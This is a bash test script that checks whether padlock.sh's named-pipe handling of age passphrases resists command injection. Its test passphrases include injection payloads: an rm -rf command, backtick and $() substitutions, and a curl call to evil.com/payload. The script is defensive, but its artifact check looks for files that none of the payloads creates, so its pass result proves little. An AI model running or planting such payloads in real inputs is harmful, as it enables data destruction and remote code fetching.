#!/bin/bash

# Security Validation Test for Named Pipe Strategy
# Tests the security fix for command injection vulnerability

set -euo pipefail

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo "🔒 Security Validation Test - Named Pipe Strategy"
echo "=================================================="

# Test dangerous passphrases that could cause command injection
dangerous_passphrases=(
    "'; rm -rf /tmp/test; echo 'pwned"
    "\$(echo 'injection')"
    "pass\`id\`word"
    "a'b\"c\$d;e|f&g"
    "\$(curl evil.com/payload 2>/dev/null || echo 'blocked')"
    "normal_password_123"
)

# Source the helper functions from the built script
source ./padlock.sh

echo "📋 Testing dangerous passphrases with Named Pipe Strategy..."
echo ""

test_count=0
pass_count=0

for passphrase in "${dangerous_passphrases[@]}"; do
    ((test_count++))
    echo -n "Test $test_count: Testing passphrase with potential injection... "
    
    # Create test files
    test_input=$(mktemp)
    test_output=$(mktemp)
    echo "test content for encryption" > "$test_input"
    
    # Try to encrypt with the dangerous passphrase
    if _age_interactive_encrypt "$test_input" "$test_output" "$passphrase" 2>/dev/null; then
        # If encryption succeeded, try to decrypt with same passphrase
        if _age_interactive_decrypt "$test_output" "$passphrase" 2>/dev/null >/dev/null; then
            echo -e "${GREEN}✓ PASS${NC} - Named pipe prevented injection, encryption/decryption worked"
            ((pass_count++))
        else
            echo -e "${YELLOW}⚠ PARTIAL${NC} - Encrypt worked but decrypt failed"
        fi
    else
        echo -e "${YELLOW}⚠ SKIP${NC} - Encryption failed (possibly due to age requirements)"
    fi
    
    # Cleanup
    rm -f "$test_input" "$test_output"
done

echo ""
echo "🔍 Security Analysis Results:"
echo "============================="
echo "Total tests: $test_count"
echo "Successful: $pass_count"
echo ""

# Verify no shell injection occurred by checking for injection artifacts
echo "🛡️  Injection Prevention Verification:"
echo "======================================="

# Test for common injection artifacts that would indicate vulnerability
injection_artifacts_found=0

# Check if any malicious commands would have been executed
# (In a vulnerable system, these might create files or modify system state)
if [[ -f /tmp/pwned ]] || [[ -f /tmp/injection_test ]]; then
    echo -e "${RED}❌ CRITICAL: Injection artifacts found!${NC}"
    ((injection_artifacts_found++))
else
    echo -e "${GREEN}✓ SECURE: No injection artifacts detected${NC}"
fi

echo ""
echo "📊 Final Security Assessment:"
echo "============================="

if [[ $injection_artifacts_found -eq 0 ]]; then
    echo -e "${GREEN}🎯 SECURITY VALIDATION: PASSED${NC}"
    echo "✓ Named Pipe Strategy successfully prevents command injection"
    echo "✓ No shell interpolation of user-provided passphrase data"
    echo "✓ Safe to proceed with V2.0 rollout"
    exit 0
else
    echo -e "${RED}🚨 SECURITY VALIDATION: FAILED${NC}"
    echo "❌ Command injection vulnerability detected"
    echo "❌ V2.0 rollout BLOCKED until fixed"
    exit 1
fi